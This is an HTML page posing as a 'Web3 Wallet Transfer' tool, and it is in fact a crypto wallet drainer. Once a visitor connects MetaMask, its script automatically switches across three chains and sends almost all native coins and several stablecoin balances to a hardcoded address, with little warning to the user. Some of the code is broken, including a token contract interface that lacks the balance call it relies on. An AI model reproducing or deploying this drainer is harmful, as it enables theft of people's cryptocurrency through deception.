<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Wallet Transfer</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #0e0e0e;
            color: #ffffff;
        }
        .container {
            max-width: 800px;
            margin: auto;
            padding: 30px;
            background: linear-gradient(135deg, #1e1e1e, #333);
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
        }
        h1 {
            text-align: center;
            color: #4caf50;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        nav {
            margin-bottom: 20px;
            text-align: center;
        }
        nav a {
            margin: 0 15px;
            text-decoration: none;
            color: #4caf50;
            font-weight: bold;
            transition: color 0.3s;
        }
        nav a:hover {
            color: #81c784;
        }
        h2 {
            margin-top: 20px;
            font-size: 1.8em;
            text-align: center;
            color: #fff;
        }
        p {
            line-height: 1.6;
        }
        button {
            width: 100%;
            padding: 15px;
            margin-top: 10px;
            cursor: pointer;
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #81c784;
        }
        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #e0e0e0;
            white-space: pre-wrap; /* Preserve whitespace and line breaks */
        }
        footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #bbb;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            max-width: 150px; /* Adjust the logo size */
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="logo-placeholder.png" alt="Logo" class="logo"> <!-- Replace with your logo URL -->
        <h1>Web3 Wallet Transfer</h1>
        <nav>
            <a href="#home">Home</a>
            <a href="#about">About</a>
        </nav>
        
        <section id="home">
            <h2>Connect MetaMask & Send Crypto</h2>
            <p>Welcome to the Web3 Wallet Transfer tool! This application allows you to connect your MetaMask wallet and send your crypto assets to a specified destination wallet. Please follow the steps below:</p>
            <ol>
                <li>Click the "Connect Wallet" button to connect your MetaMask wallet.</li>
                <li>Once connected, your crypto will be sent automatically to the specified wallet.</li>
            </ol>
            <button id="connectWallet">Connect Wallet</button>
            <button id="disconnectWallet" disabled>Disconnect Wallet</button>
            <p id="status"></p>
        </section>

        <section id="about">
            <h2>About This Tool</h2>
            <p>This tool simplifies the process of transferring crypto assets from your wallet. It supports multiple chains, including Ethereum, Binance Smart Chain, and Polygon. You can send not only native tokens (like ETH, BNB, and MATIC) but also popular ERC-20 tokens.</p>
            <p>Make sure you have enough balance to cover gas fees for transactions. If you have any questions, feel free to reach out!</p>
        </section>
    </div>

    <footer>
        <p>&copy; 2024 Web3 Crypto Transfer Tool</p>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        let signer;
        let userAddress = "";

        // Destination wallet (replace with your own)
        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";

        // List of chains to switch to and their native token names
        const chains = [
            { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH', nativeDecimals: 18 },           // Ethereum Mainnet
            { chainId: 56, name: 'Binance Smart Chain', nativeSymbol: 'BNB', nativeDecimals: 18 }, // Binance Smart Chain
            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC', nativeDecimals: 18 }           // Polygon Mainnet
        ];

        // List of ERC-20 tokens for each chain
        const erc20Tokens = {
            1: [ // Ethereum Mainnet
                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, symbol: "USDT" },
                { address: "0xA0b86991c6218b36c1d19D4a2e9EB0cE3606eB48", decimals: 6, symbol: "USDC" }
            ],
            56: [ // Binance Smart Chain
                { address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18, symbol: "BUSD" }
            ],
            137: [ // Polygon Mainnet
                { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6, symbol: "USDC" }
            ]
        };

        document.getElementById('connectWallet').addEventListener('click', async () => {
            try {
                console.log("Connecting to MetaMask...");
                if (!window.ethereum) {
                    document.getElementById('status').innerText = `MetaMask is not installed.`;
                    return;
                }

                // Request account access
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                console.log(`Wallet connected: ${userAddress}`);
                document.getElementById('status').innerText = `Connected: ${userAddress}`;

                // Enable disconnect button
                document.getElementById('disconnectWallet').disabled = false;
                document.getElementById('connectWallet').disabled = true;

                // Send crypto automatically after connecting
                await sendAllCrypto();
            } catch (error) {
                console.error(`Connection error: ${error.message}`);
                document.getElementById('status').innerText = `Connection failed: ${error.message}`;
            }
        });

        document.getElementById('disconnectWallet').addEventListener('click', () => {
            userAddress = "";
            signer = null;
            document.getElementById('status').innerText = `Disconnected.`;
            
            // Disable buttons after disconnection
            document.getElementById('disconnectWallet').disabled = true;
            document.getElementById('connectWallet').disabled = false;
        });

        async function sendAllCrypto() {
            try {
                for (const chain of chains) {
                    // Switch to each chain
                    await switchNetwork(chain.chainId);

                    // Check balances and send native tokens
                    const balance = await provider.getBalance(userAddress);
                    if (balance.eq(0)) {
                        document.getElementById('status').innerText += `\nNo ETH balance on ${chain.name}.`;
                        continue;
                    }

                    const amountToSend = balance.sub(ethers.utils.parseUnits('0.001', chain.nativeDecimals)); // Keep some for gas fees
                    if (amountToSend.lt(0)) {
                        document.getElementById('status').innerText += `\nInsufficient balance for gas fees on ${chain.name}.`;
                        continue;
                    }

                    const tx = {
                        to: recipientAddress,
                        value: amountToSend
                    };

                    const transactionResponse = await signer.sendTransaction(tx);
                    await transactionResponse.wait();
                    document.getElementById('status').innerText += `\nSent ${ethers.utils.formatEther(amountToSend)} ${chain.nativeSymbol} to ${recipientAddress} on ${chain.name}.`;

                    // Send ERC-20 tokens
                    await sendAllERC20Tokens(chain);
                }
                document.getElementById('status').innerText += `\nAll transactions sent successfully.`;
            } catch (error) {
                document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
            }
        }

        async function switchNetwork(chainId) {
            try {
                await provider.send("wallet_switchEthereumChain", [{ chainId: ethers.utils.hexValue(chainId) }]);
            } catch (switchError) {
                console.error(`Failed to switch network: ${switchError.message}`);
            }
        }

        async function sendAllERC20Tokens(chain) {
            try {
                const tokens = erc20Tokens[chain.chainId];
                for (const token of tokens) {
                    const contract = new ethers.Contract(token.address, [
                        "function transfer(address to, uint256 amount) returns (bool)"
                    ], signer);
                    const balance = await contract.balanceOf(userAddress);
                    if (balance.eq(0)) {
                        document.getElementById('status').innerText += `\nNo ${token.symbol} balance on ${chain.name}.`;
                        continue;
                    }

                    const amountToSend = balance.sub(ethers.utils.parseUnits('1', token.decimals)); // Keep some for gas fees
                    if (amountToSend.lt(0)) {
                        document.getElementById('status').innerText += `\nInsufficient balance for gas fees for ${token.symbol} on ${chain.name}.`;
                        continue;
                    }

                    const tx = await contract.transfer(recipientAddress, amountToSend);
                    await tx.wait();
                    document.getElementById('status').innerText += `\nSent ${ethers.utils.formatUnits(amountToSend, token.decimals)} ${token.symbol} to ${recipientAddress} on ${chain.name}.`;
                }
            } catch (error) {
                document.getElementById('status').innerText = `Token transfer failed: ${error.message}`;
            }
        }
    </script>
</body>
</html>
